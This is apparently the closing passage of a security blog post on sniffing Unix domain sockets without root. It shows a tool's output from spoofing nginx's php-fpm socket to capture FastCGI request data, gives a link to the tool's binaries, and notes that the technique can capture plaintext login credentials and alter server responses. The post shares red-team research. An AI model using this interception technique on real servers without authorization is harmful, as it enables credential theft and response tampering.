<div class="codehilite"><pre><span></span><code><span class="o">/</span><span class="n">tmp</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">dsm</span><span class="w"> </span><span class="p">.</span><span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="p">.</span><span class="n">sock</span><span class="w"></span>
<span class="n">Unix</span><span class="w"> </span><span class="k">Domain</span><span class="w"> </span><span class="n">Socket</span><span class="w"> </span><span class="n">Sniffer</span><span class="w"></span>
<span class="k">by</span><span class="w"> </span><span class="nv">@caioluders</span><span class="w"></span>
<span class="o">[</span><span class="n">?</span><span class="o">]</span><span class="w"> </span><span class="n">Renamed</span><span class="w"> </span><span class="p">.</span><span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="p">.</span><span class="n">sock</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="p">.</span><span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="p">.</span><span class="n">sock</span><span class="mf">.1</span><span class="w"></span>
<span class="o">[</span><span class="n">?</span><span class="o">]</span><span class="w"> </span><span class="n">Bind</span><span class="w"> </span><span class="n">spoofed</span><span class="w"> </span><span class="n">socket</span><span class="w"> </span><span class="p">.</span><span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="p">.</span><span class="n">sock</span><span class="w"></span>
<span class="o">[</span><span class="n">?</span><span class="o">]</span><span class="w"> </span><span class="n">Spoofed</span><span class="w"> </span><span class="n">socket</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">listening</span><span class="p">...</span><span class="w"></span>
<span class="o">[</span><span class="n">?</span><span class="o">]</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="k">connection</span><span class="w"></span>

<span class="o">------------------------------------</span><span class="w"> </span><span class="p">.</span><span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="p">.</span><span class="n">sock</span><span class="w"> </span><span class="o">------------------------------------</span><span class="w"></span>
<span class="n">SCRIPT_FILENAME</span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="k">public</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="w"></span>
<span class="w">                                    </span><span class="n">QUERY_STRINGq</span><span class="o">=/&amp;</span><span class="n">REQUEST_METHODGET</span><span class="w"></span>
<span class="w">                                                                     </span><span class="n">CONTENT_TYPECONTENT_LENGTH</span><span class="w"></span>

<span class="n">SCRIPT_NAME</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="w"></span>
<span class="w">                     </span><span class="n">REQUEST_URI</span><span class="o">/</span><span class="w"></span>

<span class="n">DOCUMENT_URI</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="w"></span>
<span class="n">DOCUMENT_ROOT</span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">publiSERVER_PROTOCOLHTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="n">REQUEST_SCHEMEhttpGATEWAY_INTERFACECGI</span><span class="o">/</span><span class="mf">1.1</span><span class="w"></span>
<span class="w"> </span><span class="n">SERVER_SOFTWAREnginx</span><span class="o">/</span><span class="mf">1.18.0</span><span class="w"></span>

<span class="n">REMOTE_ADDR172</span><span class="mf">.18.0.1</span><span class="w"></span>
<span class="w">                     </span><span class="n">REMOTE_PORT57778</span><span class="w"></span>

<span class="n">SERVER_ADDR172</span><span class="mf">.18.0.2</span><span class="w"></span>
<span class="w">                     </span><span class="n">SERVER_PORT80</span><span class="w"></span>
<span class="w">                                  </span><span class="n">SERVER_NAME_REDIRECT_STATUS200</span><span class="w">    </span><span class="n">HTTP_HOST127</span><span class="mf">.0.0.1</span><span class="err">:</span><span class="mi">9022</span><span class="n">RHTTP_USER_AGENTMozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span><span class="w"> </span><span class="n">Intel</span><span class="w"> </span><span class="n">Mac</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">X</span><span class="w"> </span><span class="mf">10.14</span><span class="p">;</span><span class="w"> </span><span class="nl">rv</span><span class="p">:</span><span class="mf">85.0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="mf">85.0</span><span class="w"></span>
<span class="w">                   </span><span class="n">JHTTP_ACCEPTtext</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="nc">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="nc">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">imHTTP_ACCEPT_ENCODINGgzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflateNGUAGEpt</span><span class="o">-</span><span class="n">BR</span><span class="p">,</span><span class="n">pt</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.3</span><span class="w"></span>
<span class="n">HTTP_CONNECTIONkeep</span><span class="o">-</span><span class="n">aliveHTTP_UPGRADE_INSECURE_REQUESTS1</span><span class="w"></span>
<span class="o">-------------------------------------</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="n">Packet</span><span class="w"> </span><span class="o">-------------------------------------</span><span class="w"></span>

<span class="o">-----------------------------------</span><span class="w"> </span><span class="p">.</span><span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="p">.</span><span class="n">sock</span><span class="mf">.1</span><span class="w"> </span><span class="o">-----------------------------------</span><span class="w"></span>
<span class="k">Primary</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="nl">unknownkStatus</span><span class="p">:</span><span class="w"> </span><span class="mi">404</span><span class="w"> </span><span class="ow">Not</span><span class="w"> </span><span class="k">Found</span><span class="w"></span>
<span class="n">X</span><span class="o">-</span><span class="n">Powered</span><span class="o">-</span><span class="k">By</span><span class="err">:</span><span class="w"> </span><span class="n">PHP</span><span class="o">/</span><span class="mf">7.4.15</span><span class="w"></span>
<span class="n">Content</span><span class="o">-</span><span class="nl">type</span><span class="p">:</span><span class="w"> </span><span class="nc">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span><span class="w"> </span><span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span><span class="w"></span>

<span class="k">File</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="k">found</span><span class="p">.</span><span class="w"></span>
<span class="o">[</span><span class="n">?</span><span class="o">]</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="k">connection</span><span class="w"></span>
</code></pre></div>


<p>Static-linked binaries for red teaming purposes on <a href="https://github.com/caioluders/rootless_sniffing/blob/main/dsm?raw=true">github.com/caioluders/rootless_sniffing/blob/main/dsm?raw=true</a></p>
<h1>Conclusions</h1>
<p>It was really insightful to go this low on the unix kernel, I'm more of a web guy I guess, and helped a lot to better understand basic authorization flows on the linux kernel. Altho most of my ideas were shit and didn't work, having found that I can spoof the Unix domain socket that the Nginx uses internally is a new technique for me. This can be used on red teaming to escalate privileges, if you weren't able to root it, by getting plain text credentials on a login POST request for example. You can also do more than just sniffing the requests: you can alter the server's responses! Use your imagination, maybe I make a tool later to achieve that.</p>
<p>I don't know which frameworks uses a Unix domain socket in the same way as <code>Nginx+php-fpm</code>, but I guess that should exist more contexts that this works, please publish it if you find more scenarios. </p>
<p>I hope that this is helpful for someone ^.^</p></body><hr>by <a href='https://twitter.com/caioluders'>@caioluders</a></html>